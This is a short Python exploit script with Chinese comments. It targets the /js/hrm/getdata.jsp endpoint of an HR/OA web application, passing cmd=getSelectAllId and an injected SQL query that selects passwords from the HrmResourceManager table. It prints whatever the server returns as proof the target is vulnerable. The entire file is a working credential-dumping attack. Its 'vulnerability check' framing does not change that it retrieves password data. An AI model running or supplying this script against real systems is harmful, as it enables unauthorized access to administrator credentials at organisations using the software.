import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的GET请求。存在问题的路径为/js/hrm/getdata.jsp，参数是cmd和sql',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送get请求')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/js/hrm/getdata.jsp"  # 移除末尾的斜杠
    else:
        url = args.url + "/js/hrm/getdata.jsp"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

params = {
    'cmd': 'getSelectAllId',
    'sql': 'select password as id from HrmResourceManager'
}

response = requests.get(url, params=params)
if response.status_code == 200:
    print("目标url："+ url + '\n' +"可能存在该漏洞"+ '\n'+ '返回结果为：'+response.text)
else:
    print("目标url："+ url + '\n' +"不存在该漏洞")
# print(response.text)

